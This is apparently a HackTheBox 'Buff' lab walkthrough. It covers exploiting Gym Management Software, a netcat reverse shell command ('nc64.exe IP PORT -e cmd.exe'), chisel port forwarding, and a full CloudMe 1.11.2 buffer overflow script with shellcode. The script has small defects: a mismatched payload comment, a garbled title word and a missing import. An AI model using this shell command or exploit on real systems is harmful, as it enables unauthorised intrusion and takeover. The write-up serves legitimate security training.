# HackTheBox-Buff

## NMAP
```bash
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION

```


## PORT 8080 (HTTP)

<img src="https://imgur.com/QZG5hQW.png"/>

Going over to `contact` tab we can it's using "Gym Management Software 1.0 " so let's google that and see what comes

<img src="https://i.imgur.com/DLm7Pou.png"/>

<img src="https://i.imgur.com/oVpBYBu.png"/>

We get an exploit for this so let's use it and see if it works or not

<img src="https://imgur.com/iEqTqWn.png"/>

<img src="https://imgur.com/VlGNj2d.png"/>

<img src="https://imgur.com/liQoWKQ.png"/>

We got a shell but it's not stabilized so I am going to upload `nc64.exe` on the machine

<img src="https://imgur.com/ukq7ExH.png"/>

Now to use netcat , `nc64.exe IP PORT -e cmd.exe`

<img src="https://i.imgur.com/Xu4MKpX.png"/>

<img src="https://imgur.com/utfKaoK.png"/>

We can grab the `user.txt` (the user flag) from here, I uploaded `winpeas` which is a executable you can use for enumerating windows machines

<img src="https://imgur.com/wrT5YQR.png"/>

<img src="https://i.imgur.com/yh37tSl.png"/>

We can see that on local port 8888 there's `CloudMe` running, so let's search for an exploit 

<img src="https://imgur.com/1OROy0e.png"/>

And there's the exploit we can use but issue ,it must be ran on that port and on windows machine there's no python installed so we need to port forward 8888 so we can run this exploit .In order to do that I will use `chisel` which is an awesome tool for port forwarding

https://github.com/jpillora/chisel

We need to get chisel both , the binary for linux and executable file (exe) for windows

<img src="https://i.imgur.com/XC4NrGS.png"/>

<img src="https://imgur.com/FTH4qDD.png"/>

<img src="https://i.imgur.com/RpLNfez.png"/>

We can see we have port 8888 listening on our local machine.

In the python script we need to generate our payload using encoder and with bad bytes in the raw format so I generated a windows reverse shell payload and saved it's output in a file so I can reaplce it with the payload in the script

<img src="https://imgur.com/NylcUnZ.png"/>

<img src="https://imgur.com/Kc0RPoq.png"/>

Replace the payload also replace `buf` with `payload` variable name so this is our script

```python
# Exploit Title: CloudMe 1.11.2 - payloadfer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xdb\xde\xba\xb9\xe0\x92\x91\xd9\x74\x24\xf4\x5b\x2b"
payload += b"\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\xea\xf3\x70"
payload += b"\x64\xf0\x1c\xf6\x87\x08\xdd\x97\x0e\xed\xec\x97\x75"
payload += b"\x66\x5e\x28\xfd\x2a\x53\xc3\x53\xde\xe0\xa1\x7b\xd1"
payload += b"\x41\x0f\x5a\xdc\x52\x3c\x9e\x7f\xd1\x3f\xf3\x5f\xe8"
payload += b"\x8f\x06\x9e\x2d\xed\xeb\xf2\xe6\x79\x59\xe2\x83\x34"
payload += b"\x62\x89\xd8\xd9\xe2\x6e\xa8\xd8\xc3\x21\xa2\x82\xc3"
payload += b"\xc0\x67\xbf\x4d\xda\x64\xfa\x04\x51\x5e\x70\x97\xb3"
payload += b"\xae\x79\x34\xfa\x1e\x88\x44\x3b\x98\x73\x33\x35\xda"
payload += b"\x0e\x44\x82\xa0\xd4\xc1\x10\x02\x9e\x72\xfc\xb2\x73"
payload += b"\xe4\x77\xb8\x38\x62\xdf\xdd\xbf\xa7\x54\xd9\x34\x46"
payload += b"\xba\x6b\x0e\x6d\x1e\x37\xd4\x0c\x07\x9d\xbb\x31\x57"
payload += b"\x7e\x63\x94\x1c\x93\x70\xa5\x7f\xfc\xb5\x84\x7f\xfc"
payload += b"\xd1\x9f\x0c\xce\x7e\x34\x9a\x62\xf6\x92\x5d\x84\x2d"
payload += b"\x62\xf1\x7b\xce\x93\xd8\xbf\x9a\xc3\x72\x69\xa3\x8f"
payload += b"\x82\x96\x76\x1f\xd2\x38\x29\xe0\x82\xf8\x99\x88\xc8"
payload += b"\xf6\xc6\xa9\xf3\xdc\x6e\x43\x0e\xb7\x9a\x9e\x1e\x5d"
payload += b"\xf3\x9c\x1e\x69\xad\x28\xf8\x03\xa1\x7c\x53\xbc\x58"
payload += b"\x25\x2f\x5d\xa4\xf3\x4a\x5d\x2e\xf0\xab\x10\xc7\x7d"
payload += b"\xbf\xc5\x27\xc8\x9d\x40\x37\xe6\x89\x0f\xaa\x6d\x49"
payload += b"\x59\xd7\x39\x1e\x0e\x29\x30\xca\xa2\x10\xea\xe8\x3e"
payload += b"\xc4\xd5\xa8\xe4\x35\xdb\x31\x68\x01\xff\x21\xb4\x8a"
payload += b"\xbb\x15\x68\xdd\x15\xc3\xce\xb7\xd7\xbd\x98\x64\xbe"
payload += b"\x29\x5c\x47\x01\x2f\x61\x82\xf7\xcf\xd0\x7b\x4e\xf0"
payload += b"\xdd\xeb\x46\x89\x03\x8c\xa9\x40\x80\xbc\xe3\xc8\xa1"
payload += b"\x54\xaa\x99\xf3\x38\x4d\x74\x37\x45\xce\x7c\xc8\xb2"
payload += b"\xce\xf5\xcd\xff\x48\xe6\xbf\x90\x3c\x08\x13\x90\x14"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

payload = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except Exception as e:
	print(sys.exc_value)
```

Now let's run the script and also listen on the port we set in payload, I ran the exploit once but it didn't run , when I ran it for the second time ,I got the shell as `administartor`

<img src="https://imgur.com/c0vxV3F.png"/>

<img src="https://imgur.com/AvQVFzP.png"/>